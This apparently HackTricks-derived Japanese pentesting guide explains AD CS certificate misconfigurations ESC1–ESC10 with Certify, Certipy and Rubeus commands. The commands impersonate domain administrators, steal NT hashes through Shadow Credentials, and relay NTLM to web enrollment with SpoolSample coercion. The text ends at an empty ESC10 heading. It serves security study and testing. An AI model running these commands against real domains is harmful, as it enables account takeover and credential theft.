# AD CS ドメイン権限昇格

{{#include ../../../banners/hacktricks-training.md}}


**これは以下の投稿のエスカレーション手法セクションの要約です：**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 誤設定された証明書テンプレート - ESC1

### 説明

### 誤設定された証明書テンプレート - ESC1 の説明

- **Enterprise CA により低権限ユーザに登録権限が付与されている。**
- **Manager の承認は不要である。**
- **権限を持つ担当者の署名は不要である。**
- **証明書テンプレートのセキュリティ記述子が過度に緩く、低権限ユーザが登録権限を取得できてしまう。**
- **証明書テンプレートが認証を可能にする EKU を定義するように設定されている：**
- Extended Key Usage (EKU) の識別子として、Client Authentication (OID 1.3.6.1.5.5.7.3.2)、PKINIT Client Authentication (1.3.6.1.5.2.3.4)、Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)、Any Purpose (OID 2.5.29.37.0)、または EKU なし（SubCA）が含まれる。
- **テンプレートにより、申請者が Certificate Signing Request (CSR) に subjectAltName を含めることが許可されている：**
- Active Directory (AD) は、証明書に subjectAltName (SAN) が含まれている場合、ID 検証において SAN を優先する。つまり、CSR に SAN を指定することで、任意のユーザ（例：ドメイン管理者）を偽装するための証明書を要求できる。申請者が SAN を指定できるかどうかは、証明書テンプレートの AD オブジェクトにある `mspki-certificate-name-flag` プロパティで示される。このプロパティはビットマスクであり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが存在すると申請者による SAN の指定が許可される。

> [!CAUTION]
> 上記構成では低権限ユーザが任意の SAN を含む証明書を要求できるため、Kerberos や SChannel を介して任意のドメイン主体として認証が可能になる。

この機能は、製品やデプロイメントサービスが HTTPS やホスト証明書をオンザフライで生成することを支援するため、あるいは設定理解の不足により有効化されていることがある。

このオプションで証明書を作成すると警告が発生するが、既存の証明書テンプレート（例：`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効な `WebServer` テンプレート）を複製してから認証用 OID を追加した場合は警告が発生しない点に注意する。

### 悪用

脆弱な証明書テンプレートを見つけるには、次を実行できます：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
この脆弱性を**悪用して管理者になりすます**には、次のコマンドを実行できます:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
その後、生成された **証明書を `.pfx` に** 形式に変換して、**Rubeus または certipy を使用して認証する** のに再度使用できます:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows バイナリ "Certreq.exe" と "Certutil.exe" は PFX を生成するために使用できます: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest の構成スキーマ内の証明書テンプレートの列挙、特に承認や署名を必要とせず、Client Authentication または Smart Card Logon EKU を持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが有効になっているものは、次の LDAP クエリを実行することで行えます:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 誤設定された証明書テンプレート - ESC2

### 説明

2番目の悪用シナリオは最初のもののバリエーションです:

1. Enrollment rights are granted to low-privileged users by the Enterprise CA.
2. マネージャー承認の要件が無効化されている。
3. 承認された署名の必要性が省略されている。
4. 証明書テンプレートのセキュリティ記述子が過度に許容的で、低権限ユーザーに証明書登録権を付与している。
5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**

**Any Purpose EKU** は、クライアント認証、サーバー認証、コード署名などを含む **あらゆる目的** のために攻撃者が証明書を取得することを許可します。同じ **ESC3で使用される手法** を用いてこのシナリオを悪用することができます。

**no EKUs** を持つ証明書は下位CA証明書として機能し、**あらゆる目的** に悪用でき、**新しい証明書に署名するためにも使用可能** です。したがって、攻撃者は下位CA証明書を利用して新しい証明書に任意のEKUやフィールドを指定することができます。

ただし、下位CAがデフォルト設定である **`NTAuthCertificates`** オブジェクトによって信頼されていない場合、**ドメイン認証** 用に作成された新しい証明書は機能しません。それでも攻撃者は **任意のEKUを持つ新しい証明書** や任意の証明書値を作成することが可能であり、これらは（例：コード署名、サーバー認証など）幅広い目的で悪用される可能性があり、SAML、AD FS、IPSecなどのネットワーク内の他のアプリケーションに重大な影響を及ぼす可能性があります。

ADフォレストの構成スキーマ内でこのシナリオに一致するテンプレートを列挙するには、次のLDAPクエリを実行します:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 誤設定された Enrolment Agent テンプレート - ESC3

### 説明

このシナリオは最初と2番目のケースに似ていますが、異なる EKU（Certificate Request Agent）と2つの異なるテンプレートを**悪用**します（したがって2セットの要件があります）。

Certificate Request Agent EKU（OID 1.3.6.1.4.1.311.20.2.1）、Microsoft のドキュメントで **Enrollment Agent** と呼ばれるものは、あるプリンシパルが **別のユーザーに代わって** **証明書に登録（enroll）** することを許可します。

“enrollment agent” はそのようなテンプレートに登録し、得られた証明書を使って別のユーザーに代わって CSR に共同署名（co-sign）します。次にその共署名済み CSR を CA に送り、"enroll on behalf of" を許可するテンプレートに登録し、CA は「別の」ユーザーに属する証明書を返します。

要件 1:

- Enterprise CA によって低権限ユーザーに enrollment 権限が付与されている。
- マネージャー承認の要件が省略されている。
- 署名の許可（authorized signatures）の要件がない。
- 証明書テンプレートのセキュリティ記述子が過度に寛大で、低権限ユーザーに enrollment 権限を与えている。
- 証明書テンプレートに Certificate Request Agent EKU が含まれており、他のプリンシパルに代わって他の証明書テンプレートを要求できるようになっている。

要件 2:

- Enterprise CA が低権限ユーザーに enrollment 権限を与えている。
- マネージャー承認がバイパスされている。
- テンプレートのスキーマバージョンが 1 であるか 2 を超えており、Certificate Request Agent EKU を必要とする Application Policy Issuance Requirement を指定している。
- 証明書テンプレートで定義された EKU がドメイン認証を許可している。
- CA 側で enrollment agent に対する制限が適用されていない。

### 悪用

このシナリオは [**Certify**](https://github.com/GhostPack/Certify) または [**Certipy**](https://github.com/ly4k/Certipy) を使って悪用できます:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

しかしながら、CA の**デフォルト**設定は “**Do not restrict enrollment agents**.” である点に注意してください。管理者が enrollment agents の制限を有効にし “Restrict enrollment agents” に設定しても、デフォルトの構成は依然として極めて許容的です。これは **Everyone** が任意のテンプレートに対して、任意のユーザーとして登録できるアクセスを許可します。

## 脆弱な証明書テンプレートのアクセス制御 - ESC4

### **説明**

証明書テンプレート上の **security descriptor** は、そのテンプレートに関して特定の **AD principals** が持つ **permissions** を定義します。

もし **attacker** がテンプレートを **alter** するための必要な **permissions** を持ち、前節で説明した任意の **exploitable misconfigurations** を導入できる場合、権限昇格が可能になります。

証明書テンプレートに適用される主な権限には以下が含まれます:

- **Owner:** オブジェクトに対する暗黙の制御権を付与し、任意の属性を変更することを可能にします。
- **FullControl:** オブジェクトに対する完全な権限を与え、任意の属性を変更する能力を含みます。
- **WriteOwner:** オブジェクトの所有者を攻撃者の管理下にある主体に変更することを許可します。
- **WriteDacl:** アクセス制御を調整できるようにし、攻撃者に FullControl を付与する可能性があります。
- **WriteProperty:** 任意のオブジェクトプロパティの編集を許可します。

### Abuse

テンプレートや他の PKI オブジェクトに対して編集権を持つプリンシパルを特定するには、Certify で列挙します:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

前のものと同様の privesc の例:

ESC4 は、ユーザーが証明書テンプレートに対して書き込み権限を持っている場合を指します。例えば、この権限を悪用して証明書テンプレートの設定を書き換え、テンプレートを ESC1 に対して脆弱にすることができます。

上のパスでわかるように、これらの権限を持っているのは `JOHNPC` のみですが、我々のユーザー `JOHN` は `JOHNPC` への新しい `AddKeyCredentialLink` エッジを持っています。これは証明書に関連するテクニックなので、私はこの攻撃も実装しました。これは [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) として知られています。

以下は、被害者の NT hash を取得するための Certipy の `shadow auto` コマンドの簡単なプレビューです。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** は単一のコマンドで証明書テンプレートの設定を上書きできます。**デフォルト**では、Certipy は設定を**上書き**して**ESC1に対して脆弱**にします。  
また、**`-save-old` パラメータを指定して古い設定を保存できます**。これは攻撃後に設定を**復元**する際に便利です。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 脆弱な PKI オブジェクトのアクセス制御 - ESC5

### 説明

ACL ベースの関係が複雑に絡み合った広範なネットワークは、証明書テンプレートや Certification Authority を超える複数のオブジェクトを含み、AD CS システム全体のセキュリティに影響を及ぼす可能性があります。セキュリティに大きく影響するこれらのオブジェクトには次が含まれますが、これらに限定されません：

- CA サーバーの AD computer オブジェクト（S4U2Self や S4U2Proxy のようなメカニズムを介して侵害される可能性があります）。
- CA サーバーの RPC/DCOM サーバー。
- 特定のコンテナパス `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 配下の任意の子孫 AD オブジェクトまたはコンテナ。このパスには、Certificate Templates container、Certification Authorities container、NTAuthCertificates object、Enrollment Services Container などのコンテナおよびオブジェクトが含まれます。

これらの重要なコンポーネントのいずれかを低権限の攻撃者が掌握すると、PKI システムのセキュリティが損なわれる可能性があります。

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 説明

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) で扱われている内容は、Microsoft が定義する **`EDITF_ATTRIBUTESUBJECTALTNAME2`** フラグの影響にも触れています。この設定が Certification Authority (CA) で有効化されていると、Active Directory® から構築されたものを含む「任意のリクエスト」に対して、**ユーザー定義の値**を **subject alternative name** に含めることが許可されます。結果として、標準の User テンプレートのように権限のないユーザーの登録が許可されているテンプレートを含む、ドメイン認証用に設定された任意のテンプレートを通じて侵入者が登録できるようになります。その結果、証明書を取得して侵入者がドメイン管理者やドメイン内の他の任意のアクティブなエンティティとして認証することが可能になります。

注意：`certreq.exe` の `-attrib "SAN:"` 引数（“Name Value Pairs” と呼ばれる）を通じて CSR に alternative names を追加する方法は、ESC1 における SAN の悪用方法とは対照的です。ここでの違いは、アカウント情報が extension ではなく証明書属性の中にカプセル化される点にあります。

### 悪用

設定が有効化されているかどうかを確認するために、組織は次のコマンドを `certutil.exe` で利用できます：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
この操作は本質的に **remote registry access** を用いるため、代替の方法としては以下が考えられます:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
次のようなツール [**Certify**](https://github.com/GhostPack/Certify) と [**Certipy**](https://github.com/ly4k/Certipy) はこの誤設定を検出し悪用できます:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定を変更するには、**domain administrative** 権限または同等の権限を持っていることを前提に、任意のワークステーションから次のコマンドを実行できます:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
環境でこの構成を無効にするには、フラグを次のように削除します:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022年5月のセキュリティ更新以降、新しく発行される**証明書**には、要求者の`objectSid`プロパティを組み込んだ**セキュリティ拡張 (security extension)** が含まれるようになりました。ESC1では、このSIDは指定されたSANから派生します。しかし、**ESC6**ではSIDはSANではなく要求者の`objectSid`を反映します。\
> ESC6を悪用するには、システムがESC10（Weak Certificate Mappings）に脆弱であり、**新しいセキュリティ拡張よりもSANを優先する**必要があります。

## 脆弱な証明書認証局のアクセス制御 - ESC7

### 攻撃 1

#### 説明

証明書認証局のアクセス制御は、CAの操作を管理する権限のセットによって維持されます。これらの権限は、`certsrv.msc` を開き、CAを右クリックしてプロパティを選択し、セキュリティタブに移動することで確認できます。さらに、PSPKIモジュールを使用して、次のようなコマンドで権限を列挙することもできます:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA 管理者” and “証明書マネージャー” respectively.

#### 悪用

証明機関に対する **`ManageCA`** 権限を持つと、主体は PSPKI を使用して設定をリモートで操作できます。これには、任意のテンプレートで SAN を指定できるように **`EDITF_ATTRIBUTESUBJECTALTNAME2`** フラグを切り替えることが含まれ、domain escalation の重要な要素となります。

このプロセスは PSPKI の **Enable-PolicyModuleFlag** cmdlet を使用することで簡素化でき、GUI に直接触れずに変更が行えます。

**`ManageCertificates`** 権限を持っていると、保留中のリクエストの承認が可能になり、事実上「CA certificate manager approval」保護を迂回できます。

**Certify** と **PSPKI** モジュールの組み合わせを使って、証明書の要求、承認、ダウンロードを行うことができます:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.

Therefore, another attack is presented here.

前提条件:

- **`ManageCA`** 権限のみ
- **`Manage Certificates`** 権限（**`ManageCA`** から付与可能）
- 証明書テンプレート **`SubCA`** は **有効化** されている必要がある（**`ManageCA`** から有効化可能）

この手法は、`Manage CA` と `Manage Certificates` の両方のアクセス権を持つユーザーが **失敗する証明書リクエストを発行できる** という事実に依存しています。証明書テンプレート **`SubCA`** は **ESC1 に対して脆弱** ですが、テンプレートに登録できるのは **管理者のみ** です。したがって、**ユーザー** は **`SubCA`** への登録を **要求** することができ（その要求は **拒否** される）、その後マネージャーによって **発行される**、という流れになります。

#### Abuse

ユーザーを新しいオフィサーとして追加することで、自分自身に **`Manage Certificates`** 権限を付与できます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** テンプレートは、`-enable-template` パラメータで **CA 上で有効化** できます。デフォルトでは、`SubCA` テンプレートは有効になっています。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
この攻撃の前提条件を満たしていれば、まず **`SubCA` テンプレートに基づく証明書を要求することから始められます**.

**このリクエストは拒否さ**れますが、プライベートキーを保存し、リクエストIDを控えておきます.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
私たちの **`Manage CA` と `Manage Certificates`** があれば、`ca` コマンドと `-issue-request <request ID>` パラメータでその **失敗した証明書リクエストを発行する** ことができます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最後に、`req` コマンドと `-retrieve <request ID>` パラメータで**発行された証明書を取得**できます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

In addition to the classic ESC7 abuses (enabling EDITF attributes or approving pending requests), **Certify 2.0** revealed a brand-new primitive that only requires the *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) role on the Enterprise CA.

`ICertAdmin::SetExtension` RPC method can be executed by any principal holding *Manage Certificates*.  While the method was traditionally used by legitimate CAs to update extensions on **pending** requests, an attacker can abuse it to **append a *non-default* certificate extension** (for example a custom *Certificate Issuance Policy* OID such as `1.1.1.1`) to a request that is waiting for approval.

Because the targeted template does **not define a default value for that extension**, the CA will NOT overwrite the attacker-controlled value when the request is eventually issued.  The resulting certificate therefore contains an attacker-chosen extension that may:

* Satisfy Application / Issuance Policy requirements of other vulnerable templates (leading to privilege escalation).
* Inject additional EKUs or policies that grant the certificate unexpected trust in third-party systems.

In short, *Manage Certificates* – previously considered the “less powerful” half of ESC7 – can now be leveraged for full privilege escalation or long-term persistence, without touching CA configuration or requiring the more restrictive *Manage CA* right.

#### Abusing the primitive with Certify 2.0

1. **Submit a certificate request that will remain *pending*.**  This can be forced with a template that requires manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Append a custom extension to the pending request** using the new `manage-ca` command:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*

3. **Issue the request** (if your role also has *Manage Certificates* approval rights) or wait for an operator to approve it.  Once issued, download the certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. The resulting certificate now contains the malicious issuance-policy OID and can be used in subsequent attacks (e.g. ESC13, domain escalation, etc.).

> NOTE:  The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 説明

> [!TIP]
> AD CS がインストールされている環境では、脆弱な web enrollment endpoint が存在し、かつ少なくとも 1 つの certificate template が domain computer enrollment と client authentication を許可して公開されている（デフォルトの `Machine` テンプレートなど）場合、spooler service が動作している任意のコンピュータが攻撃者によって乗っ取られる可能性があります！

AD CS がサポートするいくつかの **HTTP ベースの enrollment 方法** は、管理者が追加のサーバーロールとしてインストールすることで利用可能になります。これらの HTTP ベースの証明書 enrollment 用インターフェースは **NTLM relay 攻撃** に対して脆弱です。攻撃者は、**侵害されたマシンから**、着信 NTLM を使って認証する任意の AD アカウントを偽装できます。被害者アカウントを偽装した状態で、攻撃者はこれらの web インターフェースにアクセスし、`User` または `Machine` certificate template を使ってクライアント認証用の証明書を要求できます。

- **web enrollment interface**（古い ASP アプリケーションで `http://<caserver>/certsrv/` にある）はデフォルトで HTTP のみを使用し、NTLM relay 攻撃に対する保護を提供しません。さらに、このインターフェースは Authorization HTTP header を通じて明示的に NTLM のみを許可しているため、Kerberos のようなより安全な認証方式は使用できません。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service、**Network Device Enrollment Service**（NDES）は、Authorization HTTP header を通じてデフォルトで negotiate 認証をサポートします。negotiate 認証は Kerberos と **NTLM の両方をサポート**するため、攻撃者は relay 攻撃中に認証を **NTLM にダウングレード** できます。これらの web サービスはデフォルトで HTTPS を有効にしていますが、HTTPS 自体は **NTLM relay 攻撃からの保護にはならない** 点に注意してください。HTTPS サービスが NTLM relay 攻撃から保護されるのは、HTTPS が channel binding と組み合わされている場合に限られます。残念ながら、AD CS は IIS 上で Extended Protection for Authentication を有効にしておらず、channel binding に必要な設定がされていません。

NTLM relay 攻撃でよくある問題は、NTLM セッションの有効期間が短いことと、NTLM signing を要求するサービスとやり取りできないことです。

しかし、この制約は NTLM relay 攻撃を利用してユーザの証明書を取得することで回避できます。証明書の有効期間がセッションの持続時間を決定し、取得した証明書は NTLM signing を要求するサービスでも使用可能です。盗用した証明書の利用方法については次を参照してください：


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay 攻撃のもう一つの制約は、**攻撃者が制御するマシンに被害者アカウントが認証する必要がある**点です。攻撃者は待つか、あるいはこの認証を **強制** しようと試みることができます：


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **悪用**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` プロパティは、企業の Certificate Authorities (CAs) が Certificate Enrollment Service (CES) のエンドポイントを格納するために使用されます。これらのエンドポイントは、ツール **Certutil.exe** を使用して解析して一覧表示できます:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify を悪用する
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) を悪用

証明書のリクエストは、デフォルトで Certipy が、アカウント名の末尾が `$` で終わるかどうかに応じて `Machine` または `User` テンプレートに基づいて行います。別のテンプレートを指定するには、`-template` パラメータを使用します。

その後、[PetitPotam](https://github.com/ly4k/PetitPotam) のような技術を用いて認証を強制することができます。ドメインコントローラを扱う場合は、`-template DomainController` の指定が必要です。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## セキュリティ拡張なし - ESC9 <a href="#id-5485" id="id-5485"></a>

### 説明

新しい値 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) は **`msPKI-Enrollment-Flag`** のためのもので、ESC9 と呼ばれ、証明書に **新しい `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張** を埋め込むことを防ぎます。このフラグは `StrongCertificateBindingEnforcement` が `1`（デフォルト設定）のときに意味を持ち、`2` の設定とは対照的です。ESC9 が存在しない場合でも要件は変わらないため、Kerberos や Schannel のより弱い証明書マッピングが悪用され得るシナリオ（ESC10 の場合のように）では、その重要性が高まります。

このフラグの設定が重要になる条件は以下を含みます：

- `StrongCertificateBindingEnforcement` が `2` に設定されていない（デフォルトは `1`）、または `CertificateMappingMethods` に `UPN` フラグが含まれている。
- 証明書が `msPKI-Enrollment-Flag` 設定内で `CT_FLAG_NO_SECURITY_EXTENSION` フラグでマークされている。
- 証明書に任意のクライアント認証 EKU が指定されている。
- 別のアカウントを侵害するための GenericWrite 権限が任意のアカウントに対して存在する。

### 悪用シナリオ

例えば、`John@corp.local` が `Jane@corp.local` に対して `GenericWrite` 権限を持ち、`Administrator@corp.local` を侵害することを目的としているとします。`Jane@corp.local` が登録を許可されている `ESC9` 証明書テンプレートは、`msPKI-Enrollment-Flag` 設定で `CT_FLAG_NO_SECURITY_EXTENSION` フラグが設定されています。

最初に、`John` の `GenericWrite` により、Shadow Credentials を使って `Jane` のハッシュが取得されます：
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
その後、`Jane`の`userPrincipalName`は`Administrator`に変更され、`@corp.local`のドメイン部分は意図的に省略されます:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
この変更は、`Administrator@corp.local` が引き続き `Administrator` の `userPrincipalName` として区別されているため、制約に違反しません。

続いて、脆弱とマークされた `ESC9` 証明書テンプレートが `Jane` として要求されます:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
証明書の`userPrincipalName`が`Administrator`を反映しており、いかなる「オブジェクトSID」も含まれていないことが確認されます。

その後、`Jane`の`userPrincipalName`は元の`Jane@corp.local`に戻される：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
発行された証明書で認証を試行すると、`Administrator@corp.local` の NT hash が取得されます。証明書にドメイン指定がないため、コマンドには `-domain <domain>` を含める必要があります:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## 脆弱な証明書マッピング - ESC10

### 説明

ESC10 はドメインコントローラー上の 2 つのレジストリキー値を指します:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` の `CertificateMappingMethods` のデフォルト値は `0x18` (`0x8 | 0x10`) で、以前は `0x1F` に設定されていました。
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` の `StrongCertificateBindingEnforcement` のデフォルト設定は `1` で、以前は `0` でした。

**ケース 1**

`StrongCertificateBindingEnforcement` が `0` に設定されている場合。

**ケース 2**

`CertificateMappingMethods` に `UPN` ビット (`0x4`) が含まれている場合。

### 悪用ケース 1

